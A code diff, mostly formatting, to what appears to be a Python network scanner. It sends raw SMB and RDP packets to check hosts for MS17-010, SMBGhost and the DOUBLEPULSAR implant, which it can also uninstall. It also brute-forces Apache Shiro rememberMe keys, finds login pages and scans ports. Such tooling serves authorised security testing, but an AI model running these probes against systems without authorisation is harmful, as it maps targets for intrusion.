+        smbpipefid0 += "\x25"  # SMB Command: Trans (0x25)
+        smbpipefid0 += "\x00"  # Error Class: Success (0x00)
+        smbpipefid0 += "\x00"  # Reserved
+        smbpipefid0 += "\x00\x00"  # Error Code: No Error
+        smbpipefid0 += "\x18"  # Flags
+        smbpipefid0 += "\x01\x28"  # Flags 2
+        smbpipefid0 += "\x00\x00"  # Process ID High 0
+        smbpipefid0 += "\x00\x00\x00\x00\x00\x00\x00\x00"  # Signature
+        smbpipefid0 += "\x00\x00"  # Reserved
+        smbpipefid0 += data[28:34]  # TID+PID+UID
+        smbpipefid0 += "\x42\xc1"  # Multiplex ID 49474
+        smbpipefid0 += "\x10"  # Word Count (WCT): 16
+        smbpipefid0 += "\x00\x00"  # Total Parameter Count: 0
+        smbpipefid0 += "\x00\x00"  # Total Data Count: 0
+        smbpipefid0 += "\xff\xff"  # Max Parameter Count: 65535
+        smbpipefid0 += "\xff\xff"  # Max Data Count: 65535
+        smbpipefid0 += "\x00"  # Max Setup Count: 0
+        smbpipefid0 += "\x00"  # Reserved: 00
+        smbpipefid0 += "\x00\x00"  # Flags: 0x0000
+        smbpipefid0 += "\x00\x00\x00\x00"  # Timeout: Return immediately (0)
+        smbpipefid0 += "\x00\x00"  # Reserved: 0000
+        smbpipefid0 += "\x00\x00"  # Parameter Count: 0
+        smbpipefid0 += "\x4a\x00"  # Parameter Offset: 74
+        smbpipefid0 += "\x00\x00"  # Data Count: 0
+        smbpipefid0 += "\x4a\x00"  # Data Offset: 74
+        smbpipefid0 += "\x02"  # Setup Count: 2
+        smbpipefid0 += "\x00"  # Reserved: 00
+        smbpipefid0 += "\x23\x00"  # Function: PeekNamedPipe (0x0023)
+        smbpipefid0 += "\x00\x00"  # FID: 0x0000
+        smbpipefid0 += "\x07\x00"  # Byte Count (BCC): 7
+        smbpipefid0 += "\x5c\x50\x49\x50\x45\x5c\x00"  # Transaction Name: \PIPE\
 
-        return struct.pack(">i", len(smbpipefid0))+smbpipefid0
+        return struct.pack(">i", len(smbpipefid0)) + smbpipefid0
 
 
 def conn17(targets, outfile, lock):
@@ -5691,13 +5890,19 @@ def conn17(targets, outfile, lock):
                 data = s.recv(1024)
                 # Get Native OS from Session Setup AndX Response
                 if data[8:10] == "\x73\x00":
-                    nativeos = data[45: 100].split(b"\x00" * 1)[0]
+                    nativeos = data[45:100].split(b"\x00" * 1)[0]
 
                 # Trans Response, Error: STATUS_INSUFF_SERVER_RESOURCES
                 if data[8:10] == "\x25\x05":
                     # 0x05 0x02 0x00 0xc0 = STATUS_INSUFF_SERVER_RESOURCES
                     if data[9:13] == "\x05\x02\x00\xc0":
-                        tempres = "[+] " + str(targets) + " is likely VULNERABLE to MS17-010  (" + nativeos + ")"
+                        tempres = (
+                            "[+] "
+                            + str(targets)
+                            + " is likely VULNERABLE to MS17-010  ("
+                            + nativeos
+                            + ")"
+                        )
                         lock.acquire(1)
                         print(tempres)
                         try:
@@ -5717,6 +5922,7 @@ def conn17(targets, outfile, lock):
     except Exception as e:
         s.close()
 
+
 def connghost(targets, outfile, lock):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -5724,9 +5930,8 @@ def connghost(targets, outfile, lock):
         s.connect(str(targets), 445)
         pkt = b'\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02"\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
         s.send(pkt)
-        
 
-        nb, = struct.unpack(">I", s.recv(4))
+        (nb,) = struct.unpack(">I", s.recv(4))
         res = s.recv(nb)
 
         if res[68:70] != b"\x11\x03" or res[70:72] != b"\x02\x00":
@@ -5755,6 +5960,7 @@ def title_unescap(title_z):
         return html.unescape(title_z)
     return htmlunescape.unescape(title_z)
 
+
 def checkbackground(body, title, url):
 
     # TODO: split domain and server info
@@ -5764,8 +5970,7 @@ def checkbackground(body, title, url):
         return True
 
     # TODO: ignore text in a label
-    elif ("管理员" in body and "登陆" in body or 
-        "登陆系统" in body):
+    elif "管理员" in body and "登陆" in body or "登陆系统" in body:
         return True
 
     try:
@@ -5776,9 +5981,17 @@ def checkbackground(body, title, url):
     # TODO: delete it when domain variable has splited
     try:
         path = urlparse(url).path.lower()
-        bak_url_list = ("/login;jsessionid=", "/login.aspx?returnurl=", "/auth/login",
-                        "/login/?next=", "wp-login.php", "/ui/#login", "/admin", "/login.html",
-                        "/admin_login.asp")
+        bak_url_list = (
+            "/login;jsessionid=",
+            "/login.aspx?returnurl=",
+            "/auth/login",
+            "/login/?next=",
+            "wp-login.php",
+            "/ui/#login",
+            "/admin",
+            "/login.html",
+            "/admin_login.asp",
+        )
 
         if path in bak_url_list:
             return True
@@ -5786,14 +5999,14 @@ def checkbackground(body, title, url):
         pass
 
     # TODO: ignore input label in comments
-    if (re.search(r"<input.*type=\"password\"", body) or 
-        re.search(r"<input.*name=\"password\"", body)):
+    if re.search(r"<input.*type=\"password\"", body) or re.search(
+        r"<input.*name=\"password\"", body
+    ):
         return True
 
 
 class dpbackdoor:
-    def __init__(self, ip, port, timeout,
-                 verbose, uninstall, print_lock):
+    def __init__(self, ip, port, timeout, verbose, uninstall, print_lock):
 
         self.ip = ip
         self.port = int(port)
@@ -5804,33 +6017,44 @@ class dpbackdoor:
 
         # smb Packets
         self.negotiate_protocol_request = binascii.unhexlify(
-            "00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
+            "00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200"
+        )
         self.session_setup_request = binascii.unhexlify(
-            "00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000")
+            "00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000"
+        )
         self.tree_connect_request = binascii.unhexlify(
-            "00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
+            "00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00"
+        )
         self.trans2_session_setup = binascii.unhexlify(
-            "0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")
-
+            "0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000"
+        )
 
         # rdp Packets
-        self.ssl_negotiation_request = binascii.unhexlify("030000130ee000000000000100080001000000")
-        self.non_ssl_negotiation_request = binascii.unhexlify("030000130ee000000000000100080000000000")
+        self.ssl_negotiation_request = binascii.unhexlify(
+            "030000130ee000000000000100080001000000"
+        )
+        self.non_ssl_negotiation_request = binascii.unhexlify(
+            "030000130ee000000000000100080000000000"
+        )
         self.non_ssl_client_data = binascii.unhexlify(
-            "030001ac02f0807f658201a00401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201020482013f000500147c00018136000800100001c00044756361812801c0d800040008000005000401ca03aa09080000b01d0000000000000000000000000000000000000000000000000000000000000000000007000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000004c00c00110000000000000002c00c001b0000000000000003c0380004000000726470647200000000008080726470736e640000000000c0647264796e766300000080c0636c6970726472000000a0c0")
+            "030001ac02f0807f658201a00401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201020482013f000500147c00018136000800100001c00044756361812801c0d800040008000005000401ca03aa09080000b01d0000000000000000000000000000000000000000000000000000000000000000000007000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000004c00c00110000000000000002c00c001b0000000000000003c0380004000000726470647200000000008080726470736e640000000000c0647264796e766300000080c0636c6970726472000000a0c0"
+        )
         self.ssl_client_data = binascii.unhexlify(
-            "030001ac02f0807f658201a00401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201020482013f000500147c00018136000800100001c00044756361812801c0d800040008000005000401ca03aa09080000b01d0000000000000000000000000000000000000000000000000000000000000000000007000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000100000004c00c00110000000000000002c00c001b0000000000000003c0380004000000726470647200000000008080726470736e640000000000c0647264796e766300000080c0636c6970726472000000a0c0")
+            "030001ac02f0807f658201a00401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201020482013f000500147c00018136000800100001c00044756361812801c0d800040008000005000401ca03aa09080000b01d0000000000000000000000000000000000000000000000000000000000000000000007000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000100000004c00c00110000000000000002c00c001b0000000000000003c0380004000000726470647200000000008080726470736e640000000000c0647264796e766300000080c0636c6970726472000000a0c0"
+        )
         self.ping_packet = binascii.unhexlify("0300000e02f0803c443728190200")
 
     # https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
     def calculate_doublepulsar_xor_key(self, s):
-        x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
-        x = x & 0xffffffff  # this line was added just to truncate to 32 bits
+        x = 2 * s ^ (
+            ((s & 0xFF00 | (s << 16)) << 8) | (((s >> 16) | s & 0xFF0000) >> 8)
+        )
+        x = x & 0xFFFFFFFF  # this line was added just to truncate to 32 bits
         return x
 
     # The arch is adjacent to the XOR key in the SMB signature
     def calculate_doublepulsar_arch(self, s):
-        if s & 0xffffffff00000000 == 0:
+        if s & 0xFFFFFFFF00000000 == 0:
             return "x86 (32-bit)"
         else:
             return "x64 (64-bit)"
@@ -5909,12 +6133,14 @@ class dpbackdoor:
         # Check for 0x51 response to indicate DOUBLEPULSAR infection
         if final_response[34] == "\x51":
             signature = final_response[18:26]
-            signature_long = struct.unpack('<Q', signature)[0]
+            signature_long = struct.unpack("<Q", signature)[0]
             key = self.calculate_doublepulsar_xor_key(signature_long)
             arch = self.calculate_doublepulsar_arch(signature_long)
             with self.print_lock:
-                print(info("[+]") + "[%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!!"
-                      " Arch: %s, XOR Key: %s" % (self.ip, arch, hex(key)))
+                print(
+                    info("[+]") + "[%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!!"
+                    " Arch: %s, XOR Key: %s" % (self.ip, arch, hex(key))
+                )
                 print("    %s" % session_setup_response[46:].split(b"\x00" * 3)[0])
                 print("    %s" % session_setup_response[46:].split(b"\x00" * 3)[1])
                 print("    %s" % session_setup_response[46:].split(b"\x00" * 3)[2])
@@ -5930,23 +6156,32 @@ class dpbackdoor:
                 modified_trans2_session_setup = "".join(modified_trans2_session_setup)
 
                 if self.verbose:
-                    self.print_status(self.ip, "Sending trans2 session setup - uninstall/burn command")
+                    self.print_status(
+                        self.ip, "Sending trans2 session setup - uninstall/burn command"
+                    )
                 s.send(modified_trans2_session_setup)
                 uninstall_response = s.recv(1024)
                 if uninstall_response[34] == "\x52":
                     with self.print_lock:
-                        print(info("[+]") + "[%s] DOUBLEPULSAR uninstall successful" % self.ip)
+                        print(
+                            info("[+]")
+                            + "[%s] DOUBLEPULSAR uninstall successful" % self.ip
+                        )
 
         else:
             with self.print_lock:
-                print(bingo("-") + "[%s] No presence of DOUBLEPULSAR SMB implant" % self.ip)
-                print("    %s" % session_setup_response[46: ].split(b"\x00" * 3)[0])
-                print("    %s" % session_setup_response[46: ].split(b"\x00" * 3)[1])
-                print("    %s" % session_setup_response[46: ].split(b"\x00" * 3)[2])
+                print(
+                    bingo("-")
+                    + "[%s] No presence of DOUBLEPULSAR SMB implant" % self.ip
+                )
+                print("    %s" % session_setup_response[46:].split(b"\x00" * 3)[0])
+                print("    %s" % session_setup_response[46:].split(b"\x00" * 3)[1])
+                print("    %s" % session_setup_response[46:].split(b"\x00" * 3)[2])
 
         s.close()
 
         # rdp mode check
+
     def check_rdp_ip(self):
         # global ssl_negotiation_request, non_ssl_negotiation_request, non_ssl_client_data, ssl_client_data, ping_packet, timeout, verbose
 
@@ -5969,10 +6204,15 @@ class dpbackdoor:
         negotiation_response = s.recv(1024)
 
         # Determine if server has chosen SSL
-        if len(negotiation_response) >= 19 and negotiation_response[11] == "\x02" and negotiation_response[
-            15] == "\x01":
+        if (
+            len(negotiation_response) >= 19
+            and negotiation_response[11] == "\x02"
+            and negotiation_response[15] == "\x01"
+        ):
             if self.verbose:
-                self.print_status(self.ip, "Server chose to use SSL - negotiating SSL connection")
+                self.print_status(
+                    self.ip, "Server chose to use SSL - negotiating SSL connection"
+                )
             sock = ssl.wrap_socket(s)
             s = sock
 
@@ -5983,10 +6223,15 @@ class dpbackdoor:
             s.recv(1024)
 
         # Server explicitly refused SSL
-        elif (len(negotiation_response) >= 19 and negotiation_response[11] == "\x03" and 
-            negotiation_response[15] == "\x02"):
+        elif (
+            len(negotiation_response) >= 19
+            and negotiation_response[11] == "\x03"
+            and negotiation_response[15] == "\x02"
+        ):
             if self.verbose:
-                self.print_status(self.ip, "Server explicitly refused SSL, reconnecting")
+                self.print_status(
+                    self.ip, "Server explicitly refused SSL, reconnecting"
+                )
 
             # Re-connect
             s.close()
@@ -6001,10 +6246,17 @@ class dpbackdoor:
             s.recv(1024)
 
         # Server requires NLA which implant does not support
-        elif len(negotiation_response) >= 19 and negotiation_response[11] == "\x03" and negotiation_response[
-            15] == "\x05":
+        elif (
+            len(negotiation_response) >= 19
+            and negotiation_response[11] == "\x03"
+            and negotiation_response[15] == "\x05"
+        ):
             with self.print_lock:
-                print(bingo("-") + "[%s] Server requires NLA, which DOUBLEPULSAR does not support" % self.ip)
+                print(
+                    bingo("-")
+                    + "[%s] Server requires NLA, which DOUBLEPULSAR does not support"
+                    % self.ip
+                )
 
             s.close()
             return
@@ -6028,13 +6280,24 @@ class dpbackdoor:
 
             with self.print_lock:
                 if len(ping_response) == 288:
-                    print(info("[+]") + "[%s] DOUBLEPULSAR RDP IMPLANT DETECTED!!!" % self.ip)
+                    print(
+                        info("[+]")
+                        + "[%s] DOUBLEPULSAR RDP IMPLANT DETECTED!!!" % self.ip
+                    )
                 else:
-                    print(bingo("-") + "[%s] Status Unknown - Response received but length was %d not 288" % (self.ip, len(ping_response)))
+                    print(
+                        bingo("-")
+                        + "[%s] Status Unknown - Response received but length was %d not 288"
+                        % (self.ip, len(ping_response))
+                    )
             s.close()
         except socket.error as e:
             with self.print_lock:
-                print(bingo("-") + "[%s] No presence of DOUBLEPULSAR RDP implant" % self.ip)
+                print(
+                    bingo("-")
+                    + "[%s] No presence of DOUBLEPULSAR RDP implant" % self.ip
+                )
+
 
 class ThreadUrl(threading.Thread):
     def __init__(self, queue, method, out_queue, lock, outfile, watches, Trie):
@@ -6096,7 +6359,6 @@ class ThreadUrl(threading.Thread):
             elif self.method == "bakscan":
                 self.method = "tscan"
 
-
             if self.method == "pscan":
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 timeout = args.ctimeout
@@ -6112,13 +6374,16 @@ class ThreadUrl(threading.Thread):
                     result = sock.connect_ex((ip, int(port)))
 
                 except socket.gaierror as e:
-                    print("Hostname could not be resolved.\nCheck if host is really up. Exiting..\n", e)
+                    print(
+                        "Hostname could not be resolved.\nCheck if host is really up. Exiting..\n",
+                        e,
+                    )
                     exit()
                 except socket.error as e:
-                    print ("Couldn't connect to server\n")
+                    print("Couldn't connect to server\n")
                     exit()
                 except Exception as e:
-                    print ("Unknown error occured", e)
+                    print("Unknown error occured", e)
                     exit()
 
                 open_ports = {}
@@ -6143,7 +6408,7 @@ class ThreadUrl(threading.Thread):
                     else:
                         if progress_num <= scaned and platform.system() == "Windows":
                             self.lock.release()
-                            progress.dones()    
+                            progress.dones()
                             self.watch.watch(1)
                 self.lock.release()
 
@@ -6152,7 +6417,7 @@ class ThreadUrl(threading.Thread):
             elif self.method == "oxid":
                 RESULT_LIST = []
                 result = get_addres(domain)
-    
+
                 if result != -1:
                     RESULT_LIST.append(result)
 
@@ -6161,7 +6426,9 @@ class ThreadUrl(threading.Thread):
                     for ip in host.keys():
                         resAlivedomainFile.write(("[*] " + ip + "\n").encode("utf-8"))
                         for other_ip in host[ip]:
-                            resAlivedomainFile.write(("\t[->] " + str(other_ip) + "\n").encode("utf-8"))
+                            resAlivedomainFile.write(
+                                ("\t[->] " + str(other_ip) + "\n").encode("utf-8")
+                            )
                 resAlivedomainFile.flush()
                 self.lock.release()
 
@@ -6172,7 +6439,7 @@ class ThreadUrl(threading.Thread):
                     else:
                         if progress_num <= scaned and platform.system() == "Windows":
                             self.lock.release()
-                            progress.dones()    
+                            progress.dones()
                             self.watch.watch(1)
                 self.lock.release()
                 progress.current += 1
@@ -6187,36 +6454,54 @@ class ThreadUrl(threading.Thread):
                     ho = urllib2.OpenerDirector()
                     ho.add_handler(urllib2.HTTPCookieProcessor(self.cookies))
                     ho.add_handler(urllib2.HTTPHandler())
-                    
 
-                    ho.add_handler(urllib2.HTTPSHandler(context=_create_unverified_https_context()))
+                    ho.add_handler(
+                        urllib2.HTTPSHandler(context=_create_unverified_https_context())
+                    )
 
                     if proxy_type and proxy_host:
                         if proxy_type == "http":
-                            ho.add_handler(urllib2.ProxyHandler({proxy_type: proxy_host, "https":proxy_host}))
+                            ho.add_handler(
+                                urllib2.ProxyHandler(
+                                    {proxy_type: proxy_host, "https": proxy_host}
+                                )
+                            )
                         elif proxy_type == "socks5":
                             proxy_h, proxy_port = proxy_host.split(":")
-                            ho.add_handler(SocksiPyHandler(socks.SOCKS5, proxy_h, int(proxy_port) ))
+                            ho.add_handler(
+                                SocksiPyHandler(socks.SOCKS5, proxy_h, int(proxy_port))
+                            )
                         elif proxy_type == "socks4":
                             proxy_h, proxy_port = proxy_host.split(":")
-                            ho.add_handler(SocksiPyHandler(socks.SOCKS4, proxy_h, int(proxy_port) ))
+                            ho.add_handler(
+                                SocksiPyHandler(socks.SOCKS4, proxy_h, int(proxy_port))
+                            )
 
                     # debug domain
                     first_domain = domain
 
                     portsuffix = re.compile(":.*", re.IGNORECASE)
-                    redomain = re.findall(portsuffix, domain.replace("https://", "").replace("http://", ""))
+                    redomain = re.findall(
+                        portsuffix,
+                        domain.replace("https://", "").replace("http://", ""),
+                    )
 
                     new_headers = copy.deepcopy(headers)
 
                     if len(redomain) > 0:
                         if ":80" in redomain:
-                            new_headers["Host"] = domain.replace("https://", "").replace("http://", "").replace(redomain[0], "")
+                            new_headers["Host"] = (
+                                domain.replace("https://", "")
+                                .replace("http://", "")
+                                .replace(redomain[0], "")
+                            )
 
                     shiro = shiro_key_generate()
                     for key in shiro.keys():
 
-                        new_headers["Cookie"] = "rememberMe=" + shiro.generate_payload(key).decode()
+                        new_headers["Cookie"] = (
+                            "rememberMe=" + shiro.generate_payload(key).decode()
+                        )
                         req = urllib2.Request(domain, headers=new_headers)
 
                         r = ho.open(req, timeout=args.timeout)
@@ -6241,20 +6526,22 @@ class ThreadUrl(threading.Thread):
                     self.lock.release()
                     progress()
 
-
-
-                    if (progress_num <= scaned or self.queue.empty()) and platform.system() == "Windows":
-                                self.lock.release()
-                                for i in range(int(args.timeout+5)):
-                                    erase()
-                                    lines = "Wait %d s to exit press Control+C to exit \r" % (args.timeout+5-i)
-                                    sys.stdout.write(info(lines))
-                                    sys.stdout.flush()
-                                    time.sleep(1)
-                                sys.stdout.flush()
-                                self.lock.acquire(1)
-                                print(info("\n\nTask completed\n"))
-                                self.watch.watch(1)
+                    if (
+                        progress_num <= scaned or self.queue.empty()
+                    ) and platform.system() == "Windows":
+                        self.lock.release()
+                        for i in range(int(args.timeout + 5)):
+                            erase()
+                            lines = "Wait %d s to exit press Control+C to exit \r" % (
+                                args.timeout + 5 - i
+                            )
+                            sys.stdout.write(info(lines))
+                            sys.stdout.flush()
+                            time.sleep(1)
+                        sys.stdout.flush()
+                        self.lock.acquire(1)
+                        print(info("\n\nTask completed\n"))
+                        self.watch.watch(1)
 
                 except Exception as e:
                     pass
@@ -6270,11 +6557,16 @@ class ThreadUrl(threading.Thread):
                         if progress_num - temp != 0:
                             temp = progress_num
                         else:
-                            if (progress_num <= scaned or self.queue.empty()) and platform.system() == "Windows":
+                            if (
+                                progress_num <= scaned or self.queue.empty()
+                            ) and platform.system() == "Windows":
                                 self.lock.release()
-                                for i in range(int(args.timeout+5)):
+                                for i in range(int(args.timeout + 5)):
                                     erase()
-                                    lines = "Wait %d s to exit press Control+C to exit \r" % (args.timeout+5-i)
+                                    lines = (
+                                        "Wait %d s to exit press Control+C to exit \r"
+                                        % (args.timeout + 5 - i)
+                                    )
                                     sys.stdout.write(info(lines))
                                     sys.stdout.flush()
                                     time.sleep(1)
@@ -6285,34 +6577,39 @@ class ThreadUrl(threading.Thread):
 
                     self.lock.release()
 
-
-
-
             elif self.method == "tscan":
                 try:
 
                     Serverinfo = ""
                     count_flag = False
-                    
 
                     self.cookies = cookielib.CookieJar()
 
                     ho = urllib2.OpenerDirector()
                     ho.add_handler(urllib2.HTTPCookieProcessor(self.cookies))
                     ho.add_handler(urllib2.HTTPHandler())
-                    
 
-                    ho.add_handler(urllib2.HTTPSHandler(context=_create_unverified_https_context()))
+                    ho.add_handler(
+                        urllib2.HTTPSHandler(context=_create_unverified_https_context())
+                    )
 
                     if proxy_type and proxy_host:
                         if proxy_type == "http":
-                            ho.add_handler(urllib2.ProxyHandler({proxy_type: proxy_host, "https":proxy_host}))
+                            ho.add_handler(
+                                urllib2.ProxyHandler(
+                                    {proxy_type: proxy_host, "https": proxy_host}
+                                )
+                            )
                         elif proxy_type == "socks5":
                             proxy_h, proxy_port = proxy_host.split(":")
-                            ho.add_handler(SocksiPyHandler(socks.SOCKS5, proxy_h, int(proxy_port) ))
+                            ho.add_handler(
+                                SocksiPyHandler(socks.SOCKS5, proxy_h, int(proxy_port))
+                            )
                         elif proxy_type == "socks4":
                             proxy_h, proxy_port = proxy_host.split(":")
-                            ho.add_handler(SocksiPyHandler(socks.SOCKS4, proxy_h, int(proxy_port) ))
+                            ho.add_handler(
+                                SocksiPyHandler(socks.SOCKS4, proxy_h, int(proxy_port))
+                            )
 
                     # debug domain
                     first_domain = domain
@@ -6322,15 +6619,24 @@ class ThreadUrl(threading.Thread):
                     # Host: 112.32.1.3:80
                     # reponse : Location: https://112.32.1.3:80
                     portsuffix = re.compile(":.*", re.IGNORECASE)
-                    redomain = re.findall(portsuffix,domain.replace("https://", "").replace("http://", ""))
+                    redomain = re.findall(
+                        portsuffix,
+                        domain.replace("https://", "").replace("http://", ""),
+                    )
 
                     new_headers = copy.deepcopy(headers)
                     if args.m == "hostscan":
                         new_headers["Host"] = domain
                         domain = args.host
+                    if args.m == "vhostscan":
+                        new_headers["Host"] = args.domain
                     if len(redomain) > 0:
                         if ":80" in redomain:
-                            new_headers["Host"] = domain.replace("https://", "").replace("http://", "").replace(redomain[0], "")
+                            new_headers["Host"] = (
+                                domain.replace("https://", "")
+                                .replace("http://", "")
+                                .replace(redomain[0], "")
+                            )
 
                     req = urllib2.Request(domain, headers=new_headers)
                     if args.dd:
@@ -6367,8 +6673,12 @@ class ThreadUrl(threading.Thread):
                     if r.getcode() == 302 or r.getcode() == 301 or r.getcode() == 307:
                         queue_task_done = -1
                         while redirct_count < 4:
-                            if (r.getcode() != 302 and r.getcode() != 301 and 
-                                r.getcode() != 400 and r.getcode() != 307):
+                            if (
+                                r.getcode() != 302
+                                and r.getcode() != 301
+                                and r.getcode() != 400
+                                and r.getcode() != 307
+                            ):
                                 break
                             redirct_count += 1
 
@@ -6377,7 +6687,11 @@ class ThreadUrl(threading.Thread):
                             else:
                                 toLocation = r.info().getheader("Location")
 
-                            if r.getcode() == 302 or r.getcode() == 301 or r.getcode() == 307:
+                            if (
+                                r.getcode() == 302
+                                or r.getcode() == 301
+                                or r.getcode() == 307
+                            ):
 
                                 self.lock.acquire(1)
                                 progress_num += 1
@@ -6387,16 +6701,17 @@ class ThreadUrl(threading.Thread):
                                 self.lock.release()
 
                                 if toLocation[:4].lower().startswith("http"):
-                                    if toLocation == domain : # or toLocation == domain + "/"
-                                        #self run self
+                                    if (
+                                        toLocation == domain
+                                    ):  # or toLocation == domain + "/"
+                                        # self run self
                                         queue_task_done = 1
                                         break
-
 
                                     # http://www.example.com  res:location:http://www.163.com    -> http://www.163.com
                                     domain = toLocation
 
-                                    #debug domain
+                                    # debug domain
 
                                     try:
                                         req = urllib2.Request(domain, headers=headers)
@@ -6412,7 +6727,6 @@ class ThreadUrl(threading.Thread):
                                         domain = domain.split("//")[0] + toLocation
 
                                         # debug domain
-
 
                                     elif toLocation.startswith("/"):
 
@@ -6432,7 +6746,9 @@ class ThreadUrl(threading.Thread):
                                             # debug domain
 
                                             try:
-                                                req = urllib2.Request(domain, headers=headers)
+                                                req = urllib2.Request(
+                                                    domain, headers=headers
+                                                )
                                                 r = ho.open(req, timeout=args.timeout)
                                             except Exception as e:
                                                 break
@@ -6441,17 +6757,24 @@ class ThreadUrl(threading.Thread):
 
                                             # http://www.163.com/123/ location:/2.php -> http://www.163.com/2.php
 
-                                            domain = domain.split("//")[0] + "//" + domain.split("//")[1].split("/")[0] + toLocation
+                                            domain = (
+                                                domain.split("//")[0]
+                                                + "//"
+                                                + domain.split("//")[1].split("/")[0]
+                                                + toLocation
+                                            )
 
-                                            #debug domain
+                                            # debug domain
 
                                             try:
-                                                req = urllib2.Request(domain, headers=headers)
+                                                req = urllib2.Request(
+                                                    domain, headers=headers
+                                                )
                                                 r = ho.open(req, timeout=args.timeout)
                                             except Exception as e:
                                                 break
                                             continue
-                                    else :
+                                    else:
                                         # http://www.example.com/test/2.php res:location: 1.php -> http://www.example.com/test/1.php
 
                                         # http://www.example.com/  location:1.php -> http://www.example.com/1.php
@@ -6459,20 +6782,30 @@ class ThreadUrl(threading.Thread):
                                         # http://www.example.com/test/2.php -> http://www.example.com/test/1.php
                                         if len(domain.split("//")[1].split("/")) > 1:
                                             # http://www.example.com/ -> http://www.example.com/1.php
-                                            domain = domain.split("//")[0] + "//" + "/".join(domain.split("//")[1].split("/")[: -1]) + "/" + toLocation
+                                            domain = (
+                                                domain.split("//")[0]
+                                                + "//"
+                                                + "/".join(
+                                                    domain.split("//")[1].split("/")[
+                                                        :-1
+                                                    ]
+                                                )
+                                                + "/"
+                                                + toLocation
+                                            )
 
                                         else:
                                             domain = domain + "/" + toLocation
 
                                         # debug domain
                                         try:
-                                            req = urllib2.Request(domain, headers=headers)
+                                            req = urllib2.Request(
+                                                domain, headers=headers
+                                            )
                                             r = ho.open(req, timeout=args.timeout)
                                         except Exception as e:
                                             break
                                         continue
-
-
 
                             if r.getcode() == 400:
                                 queue_task_done = 1
@@ -6480,7 +6813,6 @@ class ThreadUrl(threading.Thread):
                         if queue_task_done == 1:
                             self.queue.task_done()
                             continue
-
 
                     resp = r.read()
                     try:
@@ -6490,7 +6822,7 @@ class ThreadUrl(threading.Thread):
 
                         r.info().getheader = r.getheader
                     # CT = r.info().getheader("Content-Type")
-                    
+
                     if r.info().getheader("Content-Encoding") is None:
                         resp = resp
                     elif "gzip" in str(r.info().getheader("Content-Encoding")):
@@ -6498,14 +6830,16 @@ class ThreadUrl(threading.Thread):
                     else:
                         resp = resp
 
-                    # check cdn                    
